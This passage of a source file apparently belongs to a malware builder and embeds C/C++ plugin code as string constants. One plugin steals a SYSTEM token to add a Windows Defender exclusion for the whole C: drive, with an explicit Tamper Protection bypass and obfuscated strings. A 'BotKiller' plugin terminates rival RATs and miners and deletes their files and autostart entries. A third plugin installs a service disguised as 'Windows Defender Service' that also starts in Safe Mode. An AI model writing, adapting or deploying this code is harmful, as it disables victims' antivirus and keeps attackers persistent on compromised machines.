                ((IUnknown*)pInSig)->Release();
            }
            ((IUnknown*)pCls)->Release();
        }
        ((IUnknown*)pSvc)->Release();
    }
    ((IUnknown*)pLoc)->Release();
    if(coinit)CoUninitialize();
    return ok;
}

// WMI with impersonated SYSTEM token (requires admin + SeDebugPrivilege)
static BOOL _AddExclusion(const wchar_t* excludePath){
    wchar_t _d_sedp[24];_dw(_e_sedp,_d_sedp,24);
    wchar_t _d_seip[28];_dw(_e_seip,_d_seip,28);
    _EnablePrivilege(_d_sedp);
    _EnablePrivilege(_d_seip);

    HANDLE hTok=NULL,hDup=NULL;
    BOOL impersonated=FALSE;

    PROCESSENTRY32W pe={};pe.dwSize=sizeof(pe);
    HANDLE hs=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(hs!=INVALID_HANDLE_VALUE){
        if(Process32FirstW(hs,&pe)){
            do{
                wchar_t _d_wl[16];_dw(_e_wl,_d_wl,16);
                if(lstrcmpiW(pe.szExeFile,_d_wl)==0){
                    HANDLE hp=OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,FALSE,pe.th32ProcessID);
                    if(hp){
                        if(OpenProcessToken(hp,TOKEN_DUPLICATE,&hTok)){
                            DuplicateTokenEx(hTok,TOKEN_ALL_ACCESS,NULL,SecurityImpersonation,TokenImpersonation,&hDup);
                            if(hDup)impersonated=ImpersonateLoggedOnUser(hDup);
                        }
                        CloseHandle(hp);
                    }
                    break;
                }
            }while(Process32NextW(hs,&pe));
        }
        CloseHandle(hs);
    }

    BOOL ok=_WmiExclude(excludePath);

    if(impersonated)RevertToSelf();
    if(hDup)CloseHandle(hDup);
    if(hTok)CloseHandle(hTok);
    return ok;
}

// Spawn WMI exclusion as actual SYSTEM via CreateProcessWithTokenW + rundll32
// Bypasses Tamper Protection which blocks impersonated-SYSTEM WMI calls
static BOOL _RunAsSystem(void){
    if(!g_dllPath[0])return FALSE;

    wchar_t _d_sedp[24];_dw(_e_sedp,_d_sedp,24);
    wchar_t _d_seip[28];_dw(_e_seip,_d_seip,28);
    _EnablePrivilege(_d_sedp);
    _EnablePrivilege(_d_seip);

    HANDLE hSystemTok=NULL;
    PROCESSENTRY32W pe={};pe.dwSize=sizeof(pe);
    HANDLE hs=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(hs!=INVALID_HANDLE_VALUE){
        if(Process32FirstW(hs,&pe)){
            do{
                wchar_t _d_wl[16];_dw(_e_wl,_d_wl,16);
                if(lstrcmpiW(pe.szExeFile,_d_wl)==0){
                    HANDLE hp=OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,FALSE,pe.th32ProcessID);
                    if(hp){
                        HANDLE hTok=NULL;
                        if(OpenProcessToken(hp,TOKEN_DUPLICATE,&hTok)){
                            // Primary token required for CreateProcessWithTokenW
                            DuplicateTokenEx(hTok,TOKEN_ALL_ACCESS,NULL,
                                SecurityIdentification,TokenPrimary,&hSystemTok);
                            CloseHandle(hTok);
                        }
                        CloseHandle(hp);
                    }
                    break;
                }
            }while(Process32NextW(hs,&pe));
        }
        CloseHandle(hs);
    }
    if(!hSystemTok)return FALSE;

    // Build: rundll32.exe "<dllPath>",ExcludeMain
    wchar_t sys[MAX_PATH]={};
    GetSystemDirectoryW(sys,MAX_PATH);
    wchar_t _d_rdll[20];_dw(_e_rdll,_d_rdll,20);
    wchar_t _d_em[16];_dw(_e_em,_d_em,16);
    wchar_t cmd[MAX_PATH*2+64]={};
    lstrcpyW(cmd,sys);lstrcatW(cmd,_d_rdll);
    lstrcatW(cmd,g_dllPath);lstrcatW(cmd,_d_em);

    STARTUPINFOW si={};si.cb=sizeof(si);
    PROCESS_INFORMATION pi={};
    BOOL r=CreateProcessWithTokenW(hSystemTok,0,NULL,cmd,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
    CloseHandle(hSystemTok);

    if(r){
        WaitForSingleObject(pi.hProcess,15000);
        CloseHandle(pi.hProcess);CloseHandle(pi.hThread);
        return TRUE;
    }
    return FALSE;
}

// Rundll32 entry point — called as actual SYSTEM by _RunAsSystem
extern "C" __declspec(dllexport)
void WINAPI ExcludeMain(HWND,HINSTANCE,LPSTR,int){
    wchar_t _d_cbs[8];_dw(_e_cbs,_d_cbs,8);
    _WmiExclude(_d_cbs);
}

extern "C" __declspec(dllexport) BOOL WINAPI PluginMain(void){
    wchar_t _d_cbs[8];_dw(_e_cbs,_d_cbs,8);
    if(_AddExclusion(_d_cbs))return TRUE;  // impersonated SYSTEM WMI
    if(_RunAsSystem())return TRUE;          // CreateProcessWithTokenW (bypasses TP)
    return FALSE;
}

BOOL WINAPI DllMain(HINSTANCE h,DWORD r,LPVOID l){
    if(r==DLL_PROCESS_ATTACH)GetModuleFileNameW(h,g_dllPath,MAX_PATH);
    (void)l;return TRUE;
}
""";

    internal const string BotKiller = """
// BotKiller — targets unsigned processes with random/gibberish names.
// Random name = no vowels (≥6 chars), all-hex (≥8 chars), or all-digits (≥6 chars).
// Unsigned = GetFileVersionInfoSizeW returns 0.
// Both conditions required for user-writable paths (prevents false positives).
// Anti-kill: removes CriticalProcess flag + NtTerminateProcess fallback.
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>

// ── string helpers ────────────────────────────────────────────────────────
static int  _Len(const wchar_t* s){int n=0;while(s[n])n++;return n;}
static BOOL _IEq(const wchar_t* a,const wchar_t* b){
    while(*a&&*b){wchar_t ca=*a,cb=*b;if(ca>='A'&&ca<='Z')ca+=32;if(cb>='A'&&cb<='Z')cb+=32;if(ca!=cb)return FALSE;a++;b++;}
    return *a==0&&*b==0;
}
static BOOL _IStart(const wchar_t* s,const wchar_t* p){
    while(*p){wchar_t a=*s,b=*p;if(!a)return FALSE;
    if(a>='A'&&a<='Z')a+=32;if(b>='A'&&b<='Z')b+=32;if(a!=b)return FALSE;s++;p++;}return TRUE;
}

// ── privilege / ntdll handles ─────────────────────────────────────────────
static BOOL s_isAdmin=FALSE;
static HMODULE s_ntdll=NULL;
typedef LONG(WINAPI* fnNSIP_t)(HANDLE,ULONG,PVOID,ULONG);
typedef LONG(WINAPI* fnNTP_t)(HANDLE,LONG);

static void _InitPriv(){
    s_ntdll=GetModuleHandleW(L"ntdll.dll");
    HANDLE ht=NULL;
    if(!OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES,&ht))return;
    TOKEN_ELEVATION te={};DWORD sz=0;
    if(GetTokenInformation(ht,TokenElevation,(LPVOID)&te,sizeof(te),&sz))s_isAdmin=te.TokenIsElevated;
    if(!s_isAdmin){
        BYTE buf[256]={};sz=0;
        if(GetTokenInformation(ht,TokenUser,buf,sizeof(buf),&sz)){
            TOKEN_USER*tu=(TOKEN_USER*)buf;
            if(IsWellKnownSid(tu->User.Sid,WinLocalSystemSid))s_isAdmin=TRUE;
        }
    }
    if(s_isAdmin){
        LUID luid={};
        if(LookupPrivilegeValueW(NULL,L"SeDebugPrivilege",&luid)){
            TOKEN_PRIVILEGES tp={1,{{luid,SE_PRIVILEGE_ENABLED}}};
            AdjustTokenPrivileges(ht,FALSE,&tp,sizeof(tp),NULL,NULL);
        }
    }
    CloseHandle(ht);
}

// ── safe list (never kill regardless of name or signature) ─────────────────
static const wchar_t* s_safe[]={
    // Core system
    L"system",L"smss.exe",L"csrss.exe",L"wininit.exe",L"winlogon.exe",
    L"services.exe",L"lsass.exe",L"svchost.exe",L"explorer.exe",
    L"dwm.exe",L"taskhostw.exe",L"sihost.exe",L"ctfmon.exe",
    L"conhost.exe",L"dllhost.exe",L"runtimebroker.exe",
    L"msiexec.exe",L"wermgr.exe",L"audiodg.exe",
    L"spoolsv.exe",L"searchindexer.exe",L"fontdrvhost.exe",
    // Common browsers & apps
    L"chrome.exe",L"firefox.exe",L"msedge.exe",L"brave.exe",
    L"opera.exe",L"vivaldi.exe",L"iexplore.exe",
    // Messaging / social
    L"discord.exe",L"slack.exe",L"teams.exe",
    L"telegram.exe",L"ayugram.exe",L"unigram.exe",
    // Development
    L"code.exe",L"devenv.exe",L"node.exe",L"git.exe",
    // Gaming / store
    L"steam.exe",L"epicgameslauncher.exe",L"origin.exe",
    L"spotify.exe",L"onedrive.exe",L"dropbox.exe",
    NULL
};
static BOOL _IsSafe(const wchar_t* n){for(int i=0;s_safe[i];i++)if(_IEq(n,s_safe[i]))return TRUE;return FALSE;}

// ── known RAT names (backup detection) ───────────────────────────────────
static const wchar_t* s_rats[]={
    L"njrat.exe",L"asyncrat.exe",L"nanocore.exe",L"quasar.exe",
    L"remcos.exe",L"darkcomet.exe",L"orcus.exe",L"xworm.exe",
    L"dcrat.exe",L"venomrat.exe",L"bitrat.exe",L"netwire.exe",
    L"luminositylink.exe",L"pupy.exe",L"warzone.exe",
    L"gh0st.exe",L"poisonivy.exe",L"masslogger.exe",
    L"xmrig.exe",L"xmrig-cuda.exe",L"cpuminer.exe",L"minerd.exe",
    L"ethminer.exe",L"nbminer.exe",L"t-rex.exe",L"gminer.exe",
    NULL
};
static BOOL _IsKnownRat(const wchar_t* n){for(int i=0;s_rats[i];i++)if(_IEq(n,s_rats[i]))return TRUE;return FALSE;}

// ── path helpers ──────────────────────────────────────────────────────────
static wchar_t s_tmp[MAX_PATH]={},s_sys[MAX_PATH]={},s_win[MAX_PATH]={},
               s_pf[MAX_PATH]={},s_pf86[MAX_PATH]={};
static void _InitPaths(){
    GetTempPathW(MAX_PATH,s_tmp);
    GetSystemDirectoryW(s_sys,MAX_PATH);
    GetWindowsDirectoryW(s_win,MAX_PATH);
    ExpandEnvironmentStringsW(L"%ProgramFiles%",s_pf,MAX_PATH);
    ExpandEnvironmentStringsW(L"%ProgramFiles(x86)%",s_pf86,MAX_PATH);
}
static BOOL _InTmp(const wchar_t* p){return s_tmp[0]&&_IStart(p,s_tmp);}
static BOOL _IsProtected(const wchar_t* p){
    return (s_sys[0]&&_IStart(p,s_sys))||(s_win[0]&&_IStart(p,s_win))||
           (s_pf[0]&&_IStart(p,s_pf))||(s_pf86[0]&&_IStart(p,s_pf86));
}

// ── random name detection ─────────────────────────────────────────────────
// Random = no vowels (≥6 chars) OR all-hex (≥8 chars) OR all-digits (≥6 chars).
// Mixed case is fine — a name like "XvZqRtLp8" still has no vowels.
static BOOL _IsRandomName(const wchar_t* fname){
    // Strip extension — work only on the base name
    wchar_t base[MAX_PATH]={};int bl=0;
    for(int i=0;fname[i]&&fname[i]!=L'.';i++){base[bl++]=fname[i];}
    if(bl<6)return FALSE; // short names may be legitimate abbreviations

    BOOL hasVowel=FALSE,allAlphaNum=TRUE,allHex=TRUE,allDigit=TRUE;
    for(int i=0;i<bl;i++){
        wchar_t c=base[i];
        wchar_t lc=(c>='A'&&c<='Z')?c+32:c;
        if(lc==L'a'||lc==L'e'||lc==L'i'||lc==L'o'||lc==L'u')hasVowel=TRUE;
        BOOL isAlpha=(lc>=L'a'&&lc<=L'z');
        BOOL isDigit=(c>=L'0'&&c<=L'9');
        if(!isAlpha&&!isDigit)allAlphaNum=FALSE;
        if(!(isDigit||(lc>=L'a'&&lc<=L'f')))allHex=FALSE;
        if(!isDigit)allDigit=FALSE;
    }
    if(!allAlphaNum)return FALSE; // contains special chars like '-','_' → legit tool
    if(!hasVowel)return TRUE;                   // no vowels in 6+ char alphanumeric name
    if(allHex&&bl>=8)return TRUE;               // pure hex (e.g. "a1b2c3d4f5e6")
    if(allDigit&&bl>=6)return TRUE;             // all digits (e.g. "12345678")
    return FALSE;
}

// ── version info check (proxy for "unsigned") ─────────────────────────────
typedef DWORD(WINAPI* fnGFVIS_t)(LPCWSTR,LPDWORD);
static fnGFVIS_t s_gfvis=NULL;
static BOOL _HasVersionInfo(const wchar_t* path){
    if(!s_gfvis||!path||!path[0])return TRUE;
    DWORD dummy=0;return s_gfvis(path,&dummy)>0;
}

// ── get process exe path ─────────────────────────────────────────────────
typedef BOOL(WINAPI* fnQFPN_t)(HANDLE,DWORD,LPWSTR,PDWORD);
static fnQFPN_t s_qfpn=NULL;
static void _GetExePath(DWORD pid,wchar_t* out,DWORD max){
    out[0]=0;
    DWORD acc=s_isAdmin?PROCESS_QUERY_INFORMATION:PROCESS_QUERY_LIMITED_INFORMATION;
    HANDLE hp=OpenProcess(acc,FALSE,pid);
    if(!hp)hp=OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,FALSE,pid);
    if(!hp)return;
    if(s_qfpn){DWORD m=max;s_qfpn(hp,0,out,&m);}
    CloseHandle(hp);
}

// ── log helper ────────────────────────────────────────────────────────────
static wchar_t s_logPath[MAX_PATH]={};
static void _Log(const char* tag,const wchar_t* name,const wchar_t* reason){
    if(!s_logPath[0])return;
    char line[512]={};char* p=line;
    while(*tag)*p++=*tag++;
    for(int i=0;name[i]&&(p-line)<400;i++)*p++=(char)name[i];
    if(reason){*p++=' ';*p++='(';for(int i=0;reason[i]&&(p-line)<490;i++)*p++=(char)reason[i];*p++=')';}
    *p++='\n';
    HANDLE hf=CreateFileW(s_logPath,FILE_APPEND_DATA,FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if(hf==INVALID_HANDLE_VALUE)return;
    DWORD wr=0;WriteFile(hf,line,(DWORD)(p-line),&wr,NULL);CloseHandle(hf);
}

// ── anti-kill bypass + kill ───────────────────────────────────────────────
static void _SafeKill(DWORD pid,const wchar_t* name,const wchar_t* path,const wchar_t* reason){
    DWORD acc=PROCESS_TERMINATE|PROCESS_SET_INFORMATION;
    if(s_isAdmin)acc|=PROCESS_ALL_ACCESS;
    HANDLE hp=OpenProcess(acc,FALSE,pid);
    if(!hp)hp=OpenProcess(PROCESS_TERMINATE,FALSE,pid);
    if(!hp)return;

    // Remove CriticalProcess flag so TerminateProcess won't BSOD the machine
    if(s_ntdll){
        fnNSIP_t fnNSIP=(fnNSIP_t)GetProcAddress(s_ntdll,"NtSetInformationProcess");
        if(fnNSIP){ULONG v=0;fnNSIP(hp,29/*ProcessBreakOnTermination*/,&v,sizeof(v));}
    }

    BOOL ok=TerminateProcess(hp,0);

    // NtTerminateProcess as fallback — bypasses user-mode hooks that block TerminateProcess
    if(!ok&&s_ntdll){
        fnNTP_t fnNTP=(fnNTP_t)GetProcAddress(s_ntdll,"NtTerminateProcess");
        if(fnNTP){fnNTP(hp,0);ok=TRUE;}
    }
    CloseHandle(hp);

    if(ok){
        _Log("[Kill] ",name,reason);
        if(path&&path[0])
            for(int i=0;i<8;i++){Sleep(250);if(DeleteFileW(path)){_Log("[Del]  ",path,NULL);break;}}
    }
}

// ── process scan ─────────────────────────────────────────────────────────
static int _ScanProcs(DWORD myPid){
    int n=0;
    HANDLE hs=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(hs==INVALID_HANDLE_VALUE)return 0;
    PROCESSENTRY32W pe={};pe.dwSize=sizeof(pe);
    if(Process32FirstW(hs,&pe)){do{
        DWORD pid=pe.th32ProcessID;
        if(pid==myPid||pid==0||pid==4)continue;
        if(_IsSafe(pe.szExeFile))continue;

        wchar_t path[MAX_PATH]={};
        _GetExePath(pid,path,MAX_PATH);

        const wchar_t* reason=NULL;

        // 1. Known RAT name — kill regardless of path or signature
        if(_IsKnownRat(pe.szExeFile))
            reason=L"known name";

        // 2. %TEMP% + (random name OR unsigned) — high confidence
        else if(path[0]&&_InTmp(path)&&(_IsRandomName(pe.szExeFile)||!_HasVersionInfo(path)))
            reason=L"temp+random/unsigned";

        // 3. User-writable (not system/programfiles) + random name + unsigned
        //    Both conditions required to avoid killing legit tools without version info
        else if(s_isAdmin&&path[0]&&!_IsProtected(path)&&
                _IsRandomName(pe.szExeFile)&&!_HasVersionInfo(path))
            reason=L"random+unsigned";

        if(reason){_SafeKill(pid,pe.szExeFile,path,reason);n++;}
    }while(Process32NextW(hs,&pe));}
    CloseHandle(hs);return n;
}

static wchar_t* _FName(wchar_t* p){int l=_Len(p);for(int i=l-1;i>=0;i--)if(p[i]==L'\\'||p[i]==L'/')return p+i+1;return p;}

static void _CleanKey(HKEY root,const wchar_t* sub){
    HKEY hk=NULL;if(RegOpenKeyExW(root,sub,0,KEY_READ|KEY_WRITE,&hk)!=ERROR_SUCCESS)return;
    wchar_t dels[32][256]={};int dc=0;
    for(DWORD i=0;dc<32;i++){
        wchar_t nm[256]={};DWORD nl=256;
        BYTE raw[MAX_PATH*2+4]={};DWORD dl=sizeof(raw);DWORD tp=0;
        if(RegEnumValueW(hk,i,nm,&nl,NULL,&tp,raw,&dl)!=ERROR_SUCCESS)break;
        if(tp!=REG_SZ&&tp!=REG_EXPAND_SZ)continue;
        wchar_t* v=(wchar_t*)raw;if(*v==L'"')v++;
        wchar_t pb[MAX_PATH]={};int pi=0;
        while(v[pi]&&v[pi]!=L'"'&&v[pi]!=L' '&&pi<MAX_PATH-1){pb[pi]=v[pi];pi++;}
        wchar_t* fn=_FName(pb);
        if(_InTmp(pb)||_IsKnownRat(fn)||
           (s_isAdmin&&pb[0]&&!_IsProtected(pb)&&_IsRandomName(fn)&&!_HasVersionInfo(pb))){
            _Log("[Reg]  ",nm,pb);
            for(int j=0;j<256&&nm[j];j++)dels[dc][j]=nm[j];dc++;
        }
    }
    for(int i=0;i<dc;i++)RegDeleteValueW(hk,dels[i]);
    RegCloseKey(hk);
}

static void _CleanStartup(const wchar_t* folder){
    wchar_t pat[MAX_PATH]={};int fl=_Len(folder);
    for(int i=0;i<fl;i++)pat[i]=folder[i];
    pat[fl]=L'\\';pat[fl+1]=L'*';
    WIN32_FIND_DATAW fd={};HANDLE hf=FindFirstFileW(pat,&fd);
    if(hf==INVALID_HANDLE_VALUE)return;
    do{
        if(fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)continue;
        int nl=_Len(fd.cFileName);if(nl<5)continue;
        const wchar_t* ext=fd.cFileName+nl-4;
        if(!_IEq(ext,L".bat")&&!_IEq(ext,L".cmd")&&!_IEq(ext,L".vbs"))continue;
        wchar_t full[MAX_PATH]={};for(int i=0;i<fl;i++)full[i]=folder[i];
        full[fl]=L'\\';for(int i=0;fd.cFileName[i]&&i<MAX_PATH-fl-2;i++)full[fl+1+i]=fd.cFileName[i];
        if(DeleteFileW(full))_Log("[Del]  ",fd.cFileName,full);
    }while(FindNextFileW(hf,&fd));
    FindClose(hf);
}

extern "C" __declspec(dllexport) BOOL WINAPI PluginMain(void){
    _InitPaths();
    _InitPriv();
    HMODULE hK=GetModuleHandleW(L"kernel32.dll");
    if(hK)s_qfpn=(fnQFPN_t)GetProcAddress(hK,"QueryFullProcessImageNameW");

    HMODULE hV=LoadLibraryW(L"version.dll");
    if(hV)s_gfvis=(fnGFVIS_t)GetProcAddress(hV,"GetFileVersionInfoSizeW");

    GetEnvironmentVariableW(L"SERO_PLUGIN_LOG",s_logPath,MAX_PATH);
    _Log(s_isAdmin?"[Priv] admin/SYSTEM":"[Priv] user",L"",NULL);

    DWORD myPid=GetCurrentProcessId();
    int killed=_ScanProcs(myPid);

    static const wchar_t* runKeys[]={
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        L"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        L"Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run",
        NULL};
    int regCleaned=0;
    for(int i=0;runKeys[i];i++){
        _CleanKey(HKEY_CURRENT_USER,runKeys[i]);
        if(s_isAdmin)_CleanKey(HKEY_LOCAL_MACHINE,runKeys[i]);
    }

    wchar_t startup[MAX_PATH]={};
    ExpandEnvironmentStringsW(L"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",startup,MAX_PATH);
    _CleanStartup(startup);
    if(s_isAdmin){
        ExpandEnvironmentStringsW(L"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",startup,MAX_PATH);
        _CleanStartup(startup);
    }

    // Summary — always written so the operator knows what happened
    if(killed==0)
        _Log("[OK] Aucun processus suspect trouve",L"",NULL);
    else{
        // build "[OK] Killed: N processes"
        char sum[64]="[OK] Tue: ";char*p=sum;while(*p)p++;
        char tmp[12];int i=0,n=killed;
        if(n==0){*p++='0';}else{while(n>0){tmp[i++]='0'+(n%10);n/=10;}while(i>0)*p++=tmp[--i];}
        const char* suf=" processus";while(*suf)*p++=*suf++;*p=0;
        _Log(sum,L"",NULL);
    }

    if(hV)FreeLibrary(hV);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE h,DWORD r,LPVOID l){(void)h;(void)r;(void)l;return TRUE;}

""";

    internal const string BootSafeMode = """
// SafeBootPersist — registers the hosting process as a Windows service that
// auto-starts even in Safe Mode (Network + Minimal). No reboot, no bcdedit.
// Requires SYSTEM or admin privileges (use after UAC bypass).
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsvc.h>

#define SVC_NAME  L"WinDefSvc"
#define SVC_DISP  L"Windows Defender Service"

static BOOL _InstallService(const wchar_t* exePath){
    SC_HANDLE hSCM=OpenSCManagerW(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
    if(!hSCM)return FALSE;
    SC_HANDLE hSvc=OpenServiceW(hSCM,SVC_NAME,SERVICE_CHANGE_CONFIG);
    if(hSvc){
        ChangeServiceConfigW(hSvc,SERVICE_NO_CHANGE,SERVICE_NO_CHANGE,SERVICE_NO_CHANGE,
            exePath,NULL,NULL,NULL,NULL,NULL,NULL);
    } else {
        hSvc=CreateServiceW(hSCM,SVC_NAME,SVC_DISP,SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS,SERVICE_AUTO_START,SERVICE_ERROR_IGNORE,
            exePath,NULL,NULL,NULL,L"LocalSystem",NULL);
    }
    BOOL ok=(hSvc!=NULL);
    if(hSvc)CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);
    return ok;
}

static void _RegisterSafeBootKeys(const wchar_t* svcName){
    const wchar_t* modes[]={L"Network",L"Minimal"};
    for(int i=0;i<2;i++){
        wchar_t key[256]={};
        lstrcpyW(key,L"SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\");
        lstrcatW(key,modes[i]);
        lstrcatW(key,L"\\");
        lstrcatW(key,svcName);
        HKEY hk=NULL;
        if(RegCreateKeyExW(HKEY_LOCAL_MACHINE,key,0,NULL,0,KEY_SET_VALUE,NULL,&hk,NULL)==ERROR_SUCCESS){
            const wchar_t* val=L"Service";
            RegSetValueExW(hk,L"",0,REG_SZ,(const BYTE*)val,(DWORD)((lstrlenW(val)+1)*2));
            RegCloseKey(hk);
        }
    }
}

extern "C" __declspec(dllexport) BOOL WINAPI PluginMain(void){
    wchar_t exePath[MAX_PATH]={};
    GetModuleFileNameW(NULL,exePath,MAX_PATH);
    _InstallService(exePath);
    _RegisterSafeBootKeys(SVC_NAME);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE h,DWORD r,LPVOID l){(void)h;(void)r;(void)l;return TRUE;}
""";
}
